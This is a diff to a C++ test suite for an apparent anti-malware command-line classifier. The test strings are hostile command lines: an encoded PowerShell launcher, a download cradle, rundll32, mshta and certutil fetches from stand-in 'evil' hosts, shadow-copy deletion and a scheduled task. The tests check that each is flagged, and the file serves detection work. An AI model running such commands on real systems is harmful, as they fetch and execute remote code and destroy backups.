@@ -6,6 +6,7 @@
 #include "antimal/ConfigExtractor.h"
 #include "antimal/ContainerAnalyzer.h"
 #include "antimal/BootDiagnostics.h"
+#include "antimal/CommandLineClassifier.h"
 #include "antimal/Crypto.h"
 #include "antimal/DetectionSummary.h"
 #include "antimal/EventTime.h"
@@ -3910,6 +3911,39 @@ void TestPackerDetection() {
              .empty(),
          "packer: an ordinary section layout is not a packer");
   Expect(DetectPackerFromSections({}).empty(), "packer: no sections -> none");
+}
+
+// Command-line / LOLBin classifier: flags abuse patterns and does NOT flag
+// ordinary command lines.
+void TestCommandLineClassifier() {
+  using antimal::ClassifyCommandLine;
+  Expect(ClassifyCommandLine(
+             "powershell -nop -w hidden -enc SQBFAFgA").technique == "T1059.001",
+         "cmdline: encoded PowerShell");
+  Expect(ClassifyCommandLine(
+             "powershell IEX(New-Object Net.WebClient).DownloadString('http://x')")
+                 .suspicious,
+         "cmdline: PowerShell download cradle");
+  Expect(ClassifyCommandLine("rundll32 http://evil/x.dll,Start").technique ==
+             "T1218.011",
+         "cmdline: rundll32 proxy execution");
+  Expect(ClassifyCommandLine("mshta http://evil/a.hta").technique == "T1218.005",
+         "cmdline: mshta remote");
+  Expect(ClassifyCommandLine("certutil -urlcache -f http://x/a a.exe").technique ==
+             "T1140",
+         "cmdline: certutil download");
+  Expect(ClassifyCommandLine(
+             "cmd /c vssadmin delete shadows /all /quiet").technique == "T1490",
+         "cmdline: shadow-copy deletion");
+  Expect(ClassifyCommandLine("schtasks /create /tn x /tr evil.exe").technique ==
+             "T1053.005",
+         "cmdline: scheduled task");
+  // Negatives: ordinary command lines are not flagged.
+  Expect(!ClassifyCommandLine("C:\\Windows\\explorer.exe").suspicious,
+         "cmdline: explorer is not suspicious");
+  Expect(!ClassifyCommandLine("notepad.exe C:\\Users\\a\\notes.txt").suspicious,
+         "cmdline: notepad opening a file is not suspicious");
+  Expect(!ClassifyCommandLine("").suspicious, "cmdline: empty is not suspicious");
 }
 
 // Desktop-usability classifier: measures which usability goals a run achieved
@@ -8886,6 +8920,7 @@ int main() {
     TestFramePacingStats();
     TestSimulatedReport();
     TestBootDiagnostics();
+    TestCommandLineClassifier();
     TestUsabilityDiagnostics();
     TestPackerDetection();
     TestMalformedInputRobustness();
